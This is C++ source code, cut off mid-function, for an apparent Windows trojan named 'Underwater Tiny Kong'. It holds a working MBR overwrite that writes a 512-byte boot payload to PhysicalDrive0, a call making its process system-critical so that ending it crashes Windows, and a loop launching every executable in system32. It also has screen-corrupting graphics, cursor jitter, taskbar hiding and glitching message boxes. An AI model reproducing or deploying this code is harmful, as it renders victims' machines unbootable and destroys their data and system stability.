// Underwater Tiny Kong.cpp : Defines the entry point for the application.
//

#include "Underwater Tiny Kong.h"

#include <windows.h>
#include <tchar.h>
#include <ctime>
#include <winternl.h>
//#include <iostream>
#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "msimg32.lib")
#include <math.h>
#include <time.h>
#define M_PI 3.14159265358979323846264338327950288
#define SquareWave(t, freq, sampleCount) (((BYTE)(2.f * (FLOAT)(freq) * ((t) / (FLOAT)(sampleCount))) % 2) == 0 ? 1.f : -1.f)
#define TriangleWave(t, freq, sampleCount) (4.f * ( FLOAT )fabs(((FLOAT)(t) / ((FLOAT)(sampleCount) / (FLOAT)(freq))) - floor(((FLOAT)(t) / ((FLOAT)(sampleCount) / (FLOAT)(freq)))) - .5f) - 1.f)

typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, *PRGBQUAD;

typedef struct {
	FLOAT h, s, l;
} HSL;

namespace Colors {
	HSL rgb2hsl(RGBQUAD rgb) {
		HSL hsl;
		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;
		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;
		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);
		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;
		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);
		if (fDelta != 0.f) {
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);
			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}
		hsl.h = h; hsl.s = s; hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl) {
		RGBQUAD rgb;
		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;
		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);
		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;
		INT sextant;
		if (v > 0.f) {
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;
			switch (sextant) {
			case 0:
				r = v; g = mid1; b = m;
				break;
			case 1:
				r = mid2; g = v; b = m;
				break;
			case 2:
				r = m; g = v; b = mid1;
				break;
			case 3:
				r = m; g = mid2; b = v;
				break;
			case 4:
				r = mid1; g = m; b = v;
				break;
			case 5:
				r = v; g = m; b = mid2;
				break;
			}
		}
		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);
		return rgb;
	}
}

int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) {
	if (red != length) {
		red < length; red++;
		if (ifblue == true) {
			return RGB(red, 0, length);
		}
		else {
			return RGB(red, 0, 0);
		}
	}
	else {
		if (green != length) {
			green < length; green++;
			return RGB(length, green, 0);
		}
		else {
			if (blue != length) {
				blue < length; blue++;
				return RGB(0, length, blue);
			}
			else {
				red = 0; green = 0; blue = 0;
				ifblue = true;
			}
		}
	}
}

COLORREF RndRGB() {
	int clr = rand() % 5;
	if (clr == 0) return RGB(255, 0, 0);
	if (clr == 1) return RGB(0, 255, 0);
	if (clr == 2) return RGB(0, 0, 255);
	if (clr == 3) return RGB(255, 0, 255);
	if (clr == 4) return RGB(255, 255, 0);
}

LPCWSTR string() {
	srand(GetTickCount());
	WCHAR string[32];
	for (int i = 0; i < 32; i++) {
		string[i] = (WCHAR)(rand() % 256) + 1;
	}
	return string;
}

const unsigned char MasterBootRecord[] = {
	0xE8, 0x03, 0x00, 0xE8, 0x24, 0x00, 0xB4, 0x00, 0xB0, 0x13, 0xCD, 0x10,
	0x68, 0x00, 0xA0, 0x07, 0xB4, 0x0C, 0x30, 0xC0, 0x31, 0xDB, 0x31, 0xC9,
	0xBA, 0x08, 0x00, 0xDB, 0xE3, 0xE8, 0x74, 0x01, 0xC3, 0x31, 0xC9, 0xBA,
	0x08, 0x00, 0xFF, 0x06, 0xD1, 0x7D, 0x89, 0x0E, 0xD3, 0x7D, 0x89, 0x16,
	0xD5, 0x7D, 0x83, 0x3E, 0xD1, 0x7D, 0x5A, 0x0F, 0x87, 0x28, 0x01, 0x83,
	0x3E, 0xD1, 0x7D, 0x50, 0x0F, 0x87, 0xEB, 0x00, 0x83, 0x3E, 0xD1, 0x7D,
	0x46, 0x0F, 0x87, 0xD3, 0x00, 0x83, 0x3E, 0xD1, 0x7D, 0x3C, 0x0F, 0x87,
	0xB2, 0x00, 0x83, 0x3E, 0xD1, 0x7D, 0x32, 0x0F, 0x87, 0x9C, 0x00, 0x83,
	0x3E, 0xD1, 0x7D, 0x28, 0x0F, 0x87, 0x82, 0x00, 0x83, 0x3E, 0xD1, 0x7D,
	0x1E, 0x77, 0x67, 0x83, 0x3E, 0xD1, 0x7D, 0x14, 0x77, 0x50, 0x83, 0x3E,
	0xD1, 0x7D, 0x0A, 0x77, 0x32, 0x72, 0x14, 0x81, 0xF9, 0x3F, 0x01, 0x0F,
	0x83, 0x07, 0x01, 0x81, 0xFA, 0xC8, 0x00, 0x73, 0x94, 0xCD, 0x10, 0x41,
	0xEB, 0x98, 0xC3, 0xDB, 0x06, 0xD3, 0x7D, 0xD9, 0xFE, 0xD9, 0x1E, 0xD3,
	0x7D, 0xA0, 0xD3, 0x7D, 0x02, 0x06, 0xD1, 0x7D, 0x02, 0x06, 0xD1, 0x7D,
	0x02, 0x06, 0xD1, 0x7D, 0xE9, 0xCC, 0x00, 0x89, 0xCD, 0x03, 0x2E, 0xD1,
	0x7D, 0x89, 0xEB, 0x02, 0x1E, 0xD1, 0x7D, 0xC0, 0xEB, 0x03, 0x88, 0xD8,
	0xC0, 0xE8, 0x03, 0xE9, 0xA2, 0x00, 0x89, 0xCB, 0x31, 0xD3, 0x02, 0x1E,
	0xD1, 0x7D, 0x88, 0xD8, 0xC0, 0xE8, 0x03, 0xE9, 0x92, 0x00, 0x50, 0x01,
	0xCB, 0x89, 0xC8, 0x31, 0xD0, 0x31, 0xC8, 0x28, 0xC3, 0x58, 0x88, 0xD8,
	0xC0, 0xE8, 0x03, 0xE9, 0x91, 0x00, 0x50, 0x01, 0xCB, 0x89, 0xC8, 0x31,
	0xD0, 0x28, 0xC3, 0x58, 0x88, 0xD8, 0xC0, 0xE8, 0x03, 0xEB, 0x6D, 0x01,
	0xCB, 0x02, 0x1E, 0xD1, 0x7D, 0x88, 0xD8, 0xC0, 0xE8, 0x03, 0xEB, 0x60,
	0xDF, 0x06, 0xD3, 0x7D, 0xD8, 0x0E, 0xD5, 0x7D, 0xD9, 0x1E, 0xD3, 0x7D,
	0xA0, 0xD3, 0x7D, 0x02, 0x06, 0xD1, 0x7D, 0xC0, 0xE8, 0x03, 0xEB, 0x48,
	0x89, 0xCB, 0x21, 0xD3, 0x02, 0x1E, 0xD1, 0x7D, 0x88, 0xD8, 0xC0, 0xE8,
	0x03, 0xEB, 0x39, 0x89, 0x0E, 0xD7, 0x7D, 0x89, 0x16, 0xDB, 0x7D, 0xDB,
	0x06, 0xD7, 0x7D, 0xD8, 0x0E, 0xD7, 0x7D, 0xD9, 0x1E, 0xDF, 0x7D, 0xDB,
	0x06, 0xDB, 0x7D, 0xD8, 0x0E, 0xDB, 0x7D, 0xD9, 0x1E, 0xE3, 0x7D, 0x8B,
	0x1E, 0xDF, 0x7D, 0x01, 0x1E, 0xE3, 0x7D, 0xA0, 0xE3, 0x7D, 0xC0, 0xE8,
	0x03, 0x2A, 0x06, 0xD1, 0x7D, 0xEB, 0x05, 0xB8, 0x03, 0x00, 0xCD, 0x19,
	0x3C, 0x37, 0x77, 0x07, 0x3C, 0x20, 0x72, 0x07, 0xE9, 0x0C, 0xFF, 0x2C,
	0x10, 0xEB, 0xF1, 0x04, 0x20, 0xEB, 0xED, 0x3C, 0x1F, 0x77, 0x07, 0x3C,
	0x10, 0x72, 0x07, 0xE9, 0xF9, 0xFE, 0x2C, 0x10, 0xEB, 0xF1, 0x04, 0x20,
	0xEB, 0xED, 0x31, 0xC9, 0x42, 0xE9, 0x96, 0xFE, 0x50, 0x53, 0x89, 0xC8,
	0x8E, 0xD8, 0xB4, 0x0E, 0xBE, 0xB8, 0x7D, 0x8A, 0x04, 0x30, 0xFF, 0xB3,
	0x20, 0xFE, 0xC3, 0x80, 0xFB, 0x37, 0x74, 0xF7, 0xCD, 0x10, 0x46, 0x8A,
	0x04, 0x3C, 0x00, 0x75, 0xF0, 0x5B, 0x58, 0xC3, 0x55, 0x6E, 0x64, 0x65,
	0x72, 0x77, 0x61, 0x74, 0x65, 0x72, 0x20, 0x54, 0x69, 0x6E, 0x79, 0x20,
	0x4B, 0x6F, 0x6E, 0x67, 0x2E, 0x73, 0x79, 0x73, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};


DWORD WINAPI mbr(LPVOID lpParam) {
	DWORD Bytes;
	HANDLE hFile = CreateFileA(
		"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
		OPEN_EXISTING, NULL, NULL);
	WriteFile(hFile, MasterBootRecord, 512, &Bytes, NULL);
	return 1;
}

void RegAdd(HKEY HKey, LPCWSTR Subkey, LPCWSTR ValueName, unsigned long Type, unsigned int Value) { //credits to Mist0090
	HKEY hKey;
	DWORD dwDisposition;
	LONG result;
	result = RegCreateKeyExW(HKey, Subkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition);
	result = RegSetValueExW(hKey, ValueName, 0, Type, (const unsigned char*)&Value, (int)sizeof(Value));
	RegCloseKey(hKey);
	return;
}

typedef VOID(_stdcall* RtlSetProcessIsCritical) (
	IN BOOLEAN        NewValue,
	OUT PBOOLEAN OldValue,
	IN BOOLEAN     IsWinlogon);

BOOL EnablePriv(LPCWSTR lpszPriv) { //enable Privilege
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkprivs;
	ZeroMemory(&tkprivs, sizeof(tkprivs));
	if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
		return FALSE;
	if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
		CloseHandle(hToken); return FALSE;
	}
	tkprivs.PrivilegeCount = 1;
	tkprivs.Privileges[0].Luid = luid;
	tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
	CloseHandle(hToken);
	return bRet;
}

BOOL ProcessIsCritical() {
	HANDLE hDLL;
	RtlSetProcessIsCritical fSetCritical;
	hDLL = LoadLibraryA("ntdll.dll");
	if (hDLL != NULL) {
		EnablePriv(SE_DEBUG_NAME);
		(fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
		if (!fSetCritical) return 0;
		fSetCritical(1, 0, 0);
		return 1;
	}
	else
		return 0;
}

HCRYPTPROV prov;
int random() {
	if (prov == NULL)
		if (!CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
			ExitProcess(1);

	int out;
	CryptGenRandom(prov, sizeof(out), (BYTE*)(&out));
	return out & 0x7fffffff;
}
LPCWSTR GenRandomUnicodeString(int len) {
	wchar_t* strRandom = new wchar_t[len + 1];

	for (int i = 0; i < len; i++) {
		strRandom[i] = (random() % 256) + 1024;
	}

	strRandom[len] = L'\0';

	return strRandom;
}
HWND hDlg;
HANDLE glitchmsgbox1;
int MessageBoxWidth;
int MessageBoxHeight;

HHOOK hHook = NULL;
BOOL CALLBACK EnumProc(HWND hWnd, LPARAM lParam) {
	ShowWindow(hWnd, 0);
	EnableWindow(hWnd, FALSE);
	return 1;
}

DWORD WINAPI msgboxglitch(LPVOID lpParam) {
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (MessageBoxWidth * MessageBoxHeight + MessageBoxWidth) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC hdc = GetDC(hDlg);
		HDC hcdc = CreateCompatibleDC(hdc);
		HBITMAP hBitmap = CreateBitmap(MessageBoxWidth, MessageBoxHeight, 1, 32, data);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, MessageBoxWidth, MessageBoxHeight, hdc, 0, 0, SRCERASE);
		GetBitmapBits(hBitmap, 4 * MessageBoxHeight * MessageBoxWidth, data);
		int v = 0;
		BYTE byte = rand() % 0xff;
		for (int i = 0; MessageBoxWidth * MessageBoxHeight > i; ++i) {
			v = rand() % 114;
			*((BYTE*)data + 4 * i + v) -= 5;
		}
		SetBitmapBits(hBitmap, MessageBoxWidth * MessageBoxHeight * 4, data);
		BitBlt(hdc, 0, 0, MessageBoxWidth, MessageBoxHeight, hcdc, 0, 0, NOTSRCCOPY);
		DeleteObject(hBitmap);
		DeleteObject(hcdc);
		ReleaseDC(0, hdc);
		Sleep(5);
	}
}

LRESULT CALLBACK CBTProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_ACTIVATE)
	{
		hDlg = (HWND)wParam;
		RECT rect;
		GetWindowRect(hDlg, &rect);
		MessageBoxWidth = rect.right - rect.left;
		MessageBoxHeight = rect.bottom - rect.top;
		//SetWindowTextW(hDlg,GenRandomUnicodeString(44));
		EnumChildWindows(hDlg, EnumProc, 0);
		glitchmsgbox1 = CreateThread(0, 0, msgboxglitch, 0, 0, 0);
	}

	return CallNextHookEx(hHook, nCode, wParam, lParam);
}
DWORD WINAPI aerror(LPVOID lpParam) {
	//Modifed from pankoza's Oxymorphazone.exe
	while (true) {
		hHook = SetWindowsHookEx(WH_CBT, &CBTProc, NULL, GetCurrentThreadId());
		MessageBoxW(NULL, L"666", L"666", MB_ICONERROR | MB_ABORTRETRYIGNORE);
		if (hHook != NULL) {
			UnhookWindowsHookEx(hHook);
		}
		TerminateThread(glitchmsgbox1, 0);
		CloseHandle(glitchmsgbox1);
		Sleep(10);
	}
	return 0;
}

DWORD WINAPI textz(LPVOID lpParam) {
	while (true) {
		SetWindowText(GetForegroundWindow(), string());
		Sleep(10);
	}
}

DWORD WINAPI cur(LPVOID lpParam) {
	while (true) {
		POINT cpt;
		GetCursorPos(&cpt);
		int x = cpt.x, y = cpt.y;
		SetCursorPos(x + rand() % 2 + rand() % 2, y + rand() % 2 + rand() % 2);
		Sleep(10);
		SetCursorPos(x - rand() % 2 + rand() % 2, y - rand() % 2 + rand() % 2);
		Sleep(10);
	}
}

DWORD WINAPI opener(LPVOID lpParam) {
	WIN32_FIND_DATA data;
	LPCWSTR path = L"C:\\WINDOWS\\system32\\*.exe";
	while (true) {
		HANDLE find = FindFirstFileW(path, &data);
		ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);
		while (FindNextFileW(find, &data)) {
			ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);
			Sleep(rand() % 5000);
		}
	}
}

DWORD WINAPI taskbar(LPVOID lpvd) {
	static HWND hShellWnd = ::FindWindow(_T("Shell_TrayWnd"), NULL);
	ShowWindow(hShellWnd, SW_HIDE);
	return 0;
}

VOID WINAPI sound1() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = { 0 };
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t >> 1) * (t >> 10 | t >> 3) | (t >> 10 & t >> 9) * (t >> 1);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound2() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[22050 * 30] = { 0 };
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t | t % 255 | t % 256) + (t & t >> 9) + (t * (42 & t >> 10)) + ((t % ((t >> 7 | t >> 16) + 1)) ^ t));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound3() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = { 0 };
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * ((t >> 4 & t >> 8) ^ t >> 9));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound4() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = { 0 };
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * t >> ((t >> 1 | t % 16 * t >> 8) & 8 * t >> 12));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound5() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[22050 * 30] = { 0 };
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t << 2 + t >> 4 ^ t << 4 & t >> 8 | t << 1 & t >> 4);;

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound6() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = { 0 };
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((-t & t) * (255 & t * (t & t >> 3)) >> 12) + (127 & t * (t & t >> 7 & t >> 3) >> (3 & t >> 14));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound7() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = { 0 };
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t & t) * (255 & t * (t & t >> 3)) >> 12) + (127 & t * (t & t >> 7 & t >> 3) >> (3 & t >> 14));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound8() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = { 0 };
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t >> 7 | t >> 4) + (t >> 8) * t);
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound9() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = { 0 };
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t >> 11 | t >> 8 ^ 123) - t >> 1) ^ (t >> 5 | t >> 2);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound10() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[22050 * 30] = { 0 };
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t >> (1 + (t >> 10) % 2)) % 255 * (t % ((5 + ((t >> 9) % 24)))) + 1);
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

DWORD WINAPI sound(LPVOID lpParam) {
	sound1();
	Sleep(30100);
	sound2();
	Sleep(30100);
	sound3();
	Sleep(30100);
	sound4();
	Sleep(30100);
	sound5();
	Sleep(30100);
	sound6();
	Sleep(30100);
	sound7();
	Sleep(30100);
	sound8();
	Sleep(30100);
	sound9();
	Sleep(30100);
	sound10();
	Sleep(30100);
	return 1;
}

DWORD WINAPI logo(LPVOID lpParam) {
	HDC hDc = GetWindowDC(GetDesktopWindow());
	int x = rand() % GetSystemMetrics(SM_CXSCREEN);
	int y = rand() % GetSystemMetrics(SM_CYSCREEN);
	while (true)
	{
		//FreeConsole();
		x = rand() % GetSystemMetrics(SM_CXSCREEN);
		y = rand() % GetSystemMetrics(SM_CYSCREEN);
		DrawIcon(hDc, x, y, LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON1)));
		Sleep(100);
	}
}

DWORD WINAPI plgblt(LPVOID lpParam) {
	srand(time(NULL));
	int i = 0;
	while (true) {
		HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
		int w = GetSystemMetrics(0), h = GetSystemMetrics(1), rndsize = 1 + rand() % (h / 2);
		BITMAPINFO bmpi = { 0 };
		bmpi.bmiHeader = { sizeof(bmpi), w, h, 1, 32, BI_RGB };
		RGBQUAD* rgbquad = NULL; HSL hslcolor;
		HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int xxx = 0; xxx < w; xxx++) {
			StretchBlt(hcdc, xxx, -2 + rand() % 5, 1, h, hcdc, xxx, 0, 1, h, SRCPAINT);
		}
		for (int xxx = 0; xxx < w; xxx += rndsize) {
			StretchBlt(hcdc, xxx, -2 + rand() % 5, rndsize, h, hcdc, xxx, 0, rndsize, h, SRCAND);
		}
		for (int yyy = 0; yyy < h; yyy++) {
			StretchBlt(hcdc, -2 + rand() % 5, yyy, w, 1, hcdc, 0, yyy, w, 1, SRCPAINT);
		}
		for (int yyy = 0; yyy < h; yyy += rndsize) {
			StretchBlt(hcdc, -2 + rand() % 5, yyy, w, rndsize, hcdc, 0, yyy, w, rndsize, SRCAND);
		}
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				float fx = (4 * i) + ((4 * i) * tan(x / 30)) + (4 * i) + ((4 * i) * tan((y + i) / 30));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 1000.f, 1.f);
				hslcolor.s = 1.f;
				hslcolor.l += 0.1f;
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, NOTSRCCOPY);
		ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc); DeleteDC(hdc);
		Sleep(1); i += 4;
	}
}

DWORD WINAPI textout(LPVOID lpvd) {
	int x = GetSystemMetrics(0);
	int y = GetSystemMetrics(1);
	while (true) {
		HDC hdc = GetDC(0);
		SetBkMode(hdc, 0);
		LPCWSTR text = string();
		SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		HFONT font = CreateFontA(40, 20, 0, 0, FW_EXTRALIGHT, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Fredoka");
		SelectObject(hdc, font);
		TextOutW(hdc, rand() % x, rand() % y, text, strlen((const char*)text));
		DeleteObject(font);
		ReleaseDC(0, hdc);
		Sleep(100);
	}
}

DWORD WINAPI profect(LPVOID lpParam) {
	int blocksize = 80, xxx = 0; POINT point[3];
	while (true) {
		HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
		int w = GetSystemMetrics(0), h = GetSystemMetrics(1), rndsize = 1 + rand() % (h / 2), increment = 10 + rand() % 40;
		BITMAPINFO bmi = { 0 };
		PRGBQUAD rgbScreen = { 0 };
		bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32 };
		HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
		for (int yyy = 0; yyy < h; yyy += rndsize) {
